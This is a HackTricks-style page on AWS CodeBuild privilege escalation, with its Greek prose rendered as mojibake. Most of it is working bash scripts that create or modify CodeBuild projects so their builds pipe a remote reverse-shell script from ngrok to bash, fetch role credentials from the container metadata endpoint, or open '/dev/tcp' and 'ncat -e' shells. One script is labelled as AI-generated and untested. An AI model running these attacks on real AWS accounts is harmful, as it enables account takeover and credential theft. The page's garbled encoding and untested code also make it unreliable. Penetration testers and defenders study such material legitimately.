# AWS - Î•scalation Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ ÏƒÏ„Î¿ Codebuild

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ GitHub.

</details>

## codebuild

Î’ÏÎµÎ¯Ï„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚:

{% content-ref url="../aws-services/aws-codebuild-enum.md" %}
[aws-codebuild-enum.md](../aws-services/aws-codebuild-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `codebuild:CreateProject`, (`codebuild:StartBuild` | `codebuild:StartBuildBatch`)

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± **`iam:PassRole`, `codebuild:CreateProject`, ÎºÎ±Î¹ `codebuild:StartBuild` Î® `codebuild:StartBuildBatch`** Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± **ÎµÎ¾ÎµÎ»Î¯Î¾ÎµÎ¹ Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± ÏƒÎµ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ ÏÏŒÎ»Î¿ IAM Ï„Î¿Ï… codebuild** Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÏÎ½Ï„Î±Ï‚ Î­Î½Î±Î½ ÎµÎ½ÎµÏÎ³ÏŒ. 

{% tabs %}
{% tab title="Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±1" %}
```bash
# Enumerate then env and get creds
REV="env\\\\n      - curl http://169.254.170.2\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"

# Get rev shell
REV="curl https://reverse-shell.sh/4.tcp.eu.ngrok.io:11125 | bash"

JSON="{
\"name\": \"codebuild-demo-project\",
\"source\": {
\"type\": \"NO_SOURCE\",
\"buildspec\": \"version: 0.2\\\\n\\\\nphases:\\\\n  build:\\\\n    commands:\\\\n      - $REV\\\\n\"
},
\"artifacts\": {
\"type\": \"NO_ARTIFACTS\"
},
\"environment\": {
\"type\": \"LINUX_CONTAINER\",
\"image\": \"aws/codebuild/standard:1.0\",
\"computeType\": \"BUILD_GENERAL1_SMALL\"
},
\"serviceRole\": \"arn:aws:iam::947247140022:role/codebuild-CI-Build-service-role-2\"
}"


REV_PATH="/tmp/rev.json"

printf "$JSON" > $REV_PATH

# Create project
aws codebuild create-project --cli-input-json file://$REV_PATH

# Build it
aws codebuild start-build --project-name codebuild-demo-project

# Wait 3-4 mins until it's executed
# Then you can access the logs in the console to find the AWS role token in the output

# Delete the project
aws codebuild delete-project --name codebuild-demo-project
```
{% endtab %}

{% tab title="Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±2" %}
{% code overflow="wrap" %}
```bash
# Generated by AI, not tested
# Create a buildspec.yml file with reverse shell command
echo 'version: 0.2
phases:
build:
commands:
- curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash' > buildspec.yml

# Upload the buildspec to the bucket and give access to everyone
aws s3 cp buildspec.yml s3:<S3_BUCKET_NAME>/buildspec.yml

# Create a new CodeBuild project with the buildspec.yml file
aws codebuild create-project --name reverse-shell-project --source type=S3,location=<S3_BUCKET_NAME>/buildspec.yml --artifacts type=NO_ARTIFACTS --environment computeType=BUILD_GENERAL1_SMALL,image=aws/codebuild/standard:5.0,type=LINUX_CONTAINER --service-role <YOUR_HIGH_PRIVILEGE_ROLE_ARN> --timeout-in-minutes 60

# Start a build with the new project
aws codebuild start-build --project-name reverse-shell-project

```
{% endcode %}
{% endtab %}
{% endtabs %}

**Î Î¹Î¸Î±Î½Î® Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·:** Î†Î¼ÎµÏƒÎ· Î±ÏÎ¾Î·ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ ÏƒÎµ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ ÏÏŒÎ»Î¿ AWS Codebuild.

{% hint style="warning" %}
Î£Îµ Î­Î½Î± **container Codebuild**, Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ `/codebuild/output/tmp/env.sh` Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î­Ï‚ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚ Ï€Î¿Ï… Ï‡ÏÎµÎ¹Î¬Î¶Î¿Î½Ï„Î±Î¹ Î³Î¹Î± Î½Î± Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î± **Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Î¼ÎµÏ„Î±Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½**.

Î‘Ï…Ï„ÏŒ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î· Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚ `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î· **Î´Î¹Î±Î´ÏÎ¿Î¼Î® URL** Î³Î¹Î± Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î±. Î˜Î± ÎµÎ¯Î½Î±Î¹ ÎºÎ¬Ï„Î¹ ÏƒÎ±Î½ Î±Ï…Ï„ÏŒ `/v2/credentials/2817702c-efcf-4485-9730-8e54303ec420`

Î ÏÎ¿ÏƒÎ¸Î­ÏƒÏ„Îµ Î±Ï…Ï„ÏŒ ÏƒÏ„Î¿ URL **`http://169.254.170.2/`** ÎºÎ±Î¹ Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Î½Î±ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Ï„Î¿Ï… ÏÏŒÎ»Î¿Ï….

Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Ï„Î· Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚ `ECS_CONTAINER_METADATA_URI` Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î¿ Ï€Î»Î®ÏÎµÏ‚ URL Î³Î¹Î± Î½Î± Î»Î¬Î²ÎµÏ„Îµ **Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î¼ÎµÏ„Î±Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿ container**.
{% endhint %}

### `iam:PassRole`, `codebuild:UpdateProject`, (`codebuild:StartBuild` | `codebuild:StartBuildBatch`)

ÎŒÏ€Ï‰Ï‚ ÎºÎ±Î¹ ÏƒÏ„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· ÎµÎ½ÏŒÏ„Î·Ï„Î±, Î±Î½ Î±Î½Ï„Î¯ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± Î­ÏÎ³Î¿ ÎºÎ±Ï„Î±ÏƒÎºÎµÏ…Î®Ï‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î¿ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï…Ï€Î¿Î´ÎµÎ¯Î¾ÎµÏ„Îµ Ï„Î¿Î½ ÏÏŒÎ»Î¿ IAM ÎºÎ±Î¹ Î½Î± ÎºÎ»Î­ÏˆÎµÏ„Îµ Ï„Î¿ Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÏŒ.
```bash
REV_PATH="/tmp/codebuild_pwn.json"

# Enumerate then env and get creds
REV="env\\\\n      - curl http://169.254.170.2\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"

# Get rev shell
REV="curl https://reverse-shell.sh/4.tcp.eu.ngrok.io:11125 | bash"

# You need to indicate the name of the project you want to modify
JSON="{
\"name\": \"<codebuild-demo-project>\",
\"source\": {
\"type\": \"NO_SOURCE\",
\"buildspec\": \"version: 0.2\\\\n\\\\nphases:\\\\n  build:\\\\n    commands:\\\\n      - $REV\\\\n\"
},
\"artifacts\": {
\"type\": \"NO_ARTIFACTS\"
},
\"environment\": {
\"type\": \"LINUX_CONTAINER\",
\"image\": \"aws/codebuild/standard:1.0\",
\"computeType\": \"BUILD_GENERAL1_SMALL\"
},
\"serviceRole\": \"arn:aws:iam::947247140022:role/codebuild-CI-Build-service-role-2\"
}"

printf "$JSON" > $REV_PATH

aws codebuild update-project --cli-input-json file://$REV_PATH

aws codebuild start-build --project-name codebuild-demo-project
```
**Î Î¹Î¸Î±Î½Î® Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·:** Î†Î¼ÎµÏƒÎ· Î±ÏÎ¾Î·ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ ÏƒÎµ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ ÏÏŒÎ»Î¿ AWS Codebuild.

### `codebuild:UpdateProject`, (`codebuild:StartBuild` | `codebuild:StartBuildBatch`)

ÎŒÏ€Ï‰Ï‚ ÎºÎ±Î¹ ÏƒÏ„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· ÎµÎ½ÏŒÏ„Î·Ï„Î± Î±Î»Î»Î¬ **Ï‡Ï‰ÏÎ¯Ï‚ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± `iam:PassRole`**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ Î³Î¹Î± **Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï…Ï€Î±ÏÏ‡ÏŒÎ½Ï„Ï‰Î½ Î­ÏÎ³Ï‰Î½ Codebuild ÎºÎ±Î¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿Î½ ÏÏŒÎ»Î¿ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ Î®Î´Î· Î±Î½Î±Ï„ÎµÎ¸ÎµÎ¯**.

{% tabs %}
{% tab title="StartBuildBatch" %}
```sh
REV_PATH="/tmp/codebuild_pwn.json"

# Get rev shell
REV="curl https://reverse-shell.sh/4.tcp.eu.ngrok.io:11125 | sh"

# You need to indicate the name of the project you want to modify
JSON="{
\"name\": \"codebuild_lab_3_project\",
\"source\": {
\"type\": \"NO_SOURCE\",
\"buildspec\": \"version: 0.2\\\\n\\\\nbatch:\\\\n  fast-fail: false\\\\n  build-list:\\\\n    - identifier: build1\\\\n      env:\\\\n        variables:\\\\n          BUILD_ID: build1\\\\n      buildspec: |\\\\n        version: 0.2\\\\n        env:\\\\n          shell: sh\\\\n        phases:\\\\n          build:\\\\n            commands:\\\\n              - curl https://reverse-shell.sh/4.tcp.eu.ngrok.io:11125 | sh\\\\n      ignore-failure: true\\\\n\"
},
\"artifacts\": {
\"type\": \"NO_ARTIFACTS\"
},
\"environment\": {
\"type\": \"LINUX_CONTAINER\",
\"image\": \"public.ecr.aws/h0h9t7p1/alpine-bash-curl-jq:latest\",
\"computeType\": \"BUILD_GENERAL1_SMALL\",
\"imagePullCredentialsType\": \"CODEBUILD\"
}
}"

printf "$JSON" > $REV_PATH

# Note how it's used a image from AWS public ECR instead from docjerhub as dockerhub rate limits CodeBuild!

aws codebuild update-project --cli-input-json file://$REV_PATH

aws codebuild start-build-batch --project-name codebuild-demo-project
```
{% endtab %}

{% tab title="StartBuild" %}
{% code overflow="wrap" %}
```sh
REV_PATH="/tmp/codebuild_pwn.json"

# Enumerate then env and get creds
REV="env\\\\n      - curl http://169.254.170.2\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"

# Get rev shell
REV="curl https://reverse-shell.sh/4.tcp.eu.ngrok.io:11125 | sh"

JSON="{
\"name\": \"<codebuild-demo-project>\",
\"source\": {
\"type\": \"NO_SOURCE\",
\"buildspec\": \"version: 0.2\\\\n\\\\nphases:\\\\n  build:\\\\n    commands:\\\\n      - $REV\\\\n\"
},
\"artifacts\": {
\"type\": \"NO_ARTIFACTS\"
},
\"environment\": {
\"type\": \"LINUX_CONTAINER\",
\"image\": \"public.ecr.aws/h0h9t7p1/alpine-bash-curl-jq:latest\",
\"computeType\": \"BUILD_GENERAL1_SMALL\",
\"imagePullCredentialsType\": \"CODEBUILD\"
}
}"

# Note how it's used a image from AWS public ECR instead from docjerhub as dockerhub rate limits CodeBuild!

printf "$JSON" > $REV_PATH

aws codebuild update-project --cli-input-json file://$REV_PATH

aws codebuild start-build --project-name codebuild-demo-project
```
{% endcode %}
{% endtab %}
{% endtabs %}

**Î Î¹Î¸Î±Î½Î® Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·:** Î†Î¼ÎµÏƒÎ· Î±ÏÎ¾Î·ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ ÏƒÏ„Î¿Ï…Ï‚ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿Ï…Ï‚ ÏÏŒÎ»Î¿Ï…Ï‚ AWS Codebuild.

### SSM

ÎˆÏ‡Î¿Î½Ï„Î±Ï‚ **ÎµÏ€Î±ÏÎºÎ® Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î³Î¹Î± Î½Î± Î¾ÎµÎºÎ¹Î½Î®ÏƒÎµÏ„Îµ Î¼Î¹Î± ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î± ssm**, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± **Î¼Ï€ÎµÎ¯Ï„Îµ Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± Î­ÏÎ³Î¿ Codebuild** Ï€Î¿Ï… Ï…Ï€Î¿Î´Î­Ï‡ÎµÏ„Î±Î¹.

Î¤Î¿ Î­ÏÎ³Î¿ codebuild Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î­Ï‡ÎµÎ¹ Î­Î½Î± ÏƒÎ·Î¼ÎµÎ¯Î¿ Î±Î½Î±Î¼Î¿Î½Î®Ï‚:

<pre class="language-yaml"><code class="lang-yaml">phases:
pre_build:
commands:
- echo Entered the pre_build phase...
- echo "Hello World" > /tmp/hello-world
<strong>      - codebuild-breakpoint
</strong></code></pre>

ÎšÎ±Î¹ Î¼ÎµÏ„Î¬:
```bash
aws codebuild batch-get-builds --ids <buildID> --region <region> --output json
aws ssm start-session --target <sessionTarget> --region <region>
```
Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ [**ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± Î­Î³Î³ÏÎ±Ï†Î±**](https://docs.aws.amazon.com/codebuild/latest/userguide/session-manager.html).

### (`codebuild:StartBuild` | `codebuild:StartBuildBatch`), `s3:GetObject`, `s3:PutObject`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¾ÎµÎºÎ¹Î½Î®ÏƒÎµÎ¹/ÎµÏ€Î±Î½ÎµÎºÎºÎ¹Î½Î®ÏƒÎµÎ¹ Î¼Î¹Î± Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± ÎºÎ±Ï„Î±ÏƒÎºÎµÏ…Î®Ï‚ ÎµÎ½ÏŒÏ‚ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿Ï… Î­ÏÎ³Î¿Ï… CodeBuild Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÎ¹ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ `buildspec.yml` ÏƒÎµ Î­Î½Î± ÎºÎ¬Î´Î¿ S3 ÏƒÏ„Î¿Î½ Î¿Ï€Î¿Î¯Î¿ Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î»Î¬Î²ÎµÎ¹ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÎ½Ï„Î¿Î»ÏÎ½ ÏƒÏ„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± CodeBuild.

Î£Î·Î¼ÎµÎ¯Ï‰ÏƒÎ·: Î· ÎµÎ¾Î­Î»Î¹Î¾Î· ÎµÎ¯Î½Î±Î¹ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ® Î¼ÏŒÎ½Î¿ ÎµÎ¬Î½ Î¿ ÎµÏÎ³Î±Î¶ÏŒÎ¼ÎµÎ½Î¿Ï‚ Ï„Î¿Ï… CodeBuild Î­Ï‡ÎµÎ¹ Î­Î½Î±Î½ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏŒ ÏÏŒÎ»Î¿, ÎµÎ»Ï€Î¯Î¶Î¿Ï…Î¼Îµ Î¼Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±, Î±Ï€ÏŒ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Ï… ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï….
```bash
aws s3 cp s3://<build-configuration-files-bucket>/buildspec.yml ./

vim ./buildspec.yml

# Add the following lines in the "phases > pre_builds > commands" section
#
#    - apt-get install nmap -y
#    - ncat <IP> <PORT> -e /bin/sh

aws s3 cp ./buildspec.yml s3://<build-configuration-files-bucket>/buildspec.yml

aws codebuild start-build --project-name <project-name>

# Wait for the reverse shell :)
```
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ÎºÎ¬Ï„Î¹ Ï„Î­Ï„Î¿Î¹Î¿ **builspec** Î³Î¹Î± Î½Î± Ï€Î¬ÏÎµÏ„Îµ Î­Î½Î± **Î±Î½Ï„Î¯ÏƒÏ„ÏÎ¿Ï†Î¿ ÎºÎ­Î»Ï…Ï†Î¿Ï‚**:

{% code title="buildspec.yml" %}
```yaml
version: 0.2

phases:
build:
commands:
- bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18419 0>&1
```
{% endcode %}

**Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·:** Î†Î¼ÎµÏƒÎ· Î±ÏÎ¾Î·ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ ÏƒÏ„Î¿Î½ ÏÏŒÎ»Î¿ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î¿ ÎµÏÎ³Î±Î¶ÏŒÎ¼ÎµÎ½Î¿Ï‚ AWS CodeBuild Ï€Î¿Ï… ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î­Ï‡ÎµÎ¹ Ï…ÏˆÎ·Î»Î¬ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±.

{% hint style="warning" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Ï„Î¿ buildspec Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Î½Î±Î¼Î­Î½ÎµÏ„Î±Î¹ ÏƒÎµ Î¼Î¿ÏÏ†Î® zip, Î¿Ï€ÏŒÏ„Îµ Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Ï‡ÏÎµÎ¹Î±Î¶ÏŒÏ„Î±Î½ Î½Î± ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÎ¹, Î±Ï€Î¿ÏƒÏ…Î¼Ï€Î¹Î­ÏƒÎµÎ¹, Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¿ `buildspec.yml` Î±Ï€ÏŒ Ï„Î¿Î½ ÏÎ¹Î¶Î¹ÎºÏŒ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿, Î½Î± ÏƒÏ…Î¼Ï€Î¹Î­ÏƒÎµÎ¹ Î¾Î±Î½Î¬ ÎºÎ±Î¹ Î½Î± Î¼ÎµÏ„Î±Ï†Î¿ÏÏ„ÏÏƒÎµÎ¹.
{% endhint %}

Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î»ÎµÏ€Ï„Î¿Î¼Î­ÏÎµÎ¹ÎµÏ‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î²ÏÎµÎ¸Î¿ÏÎ½ [ÎµÎ´Ï](https://www.shielder.com/blog/2023/07/aws-codebuild--s3-privilege-escalation/).

**Î Î¹Î¸Î±Î½Î® Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·:** Î†Î¼ÎµÏƒÎ· Î±ÏÎ¾Î·ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ ÏƒÏ„Î¿Ï…Ï‚ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿Ï…Ï‚ ÏÏŒÎ»Î¿Ï…Ï‚ AWS Codebuild.
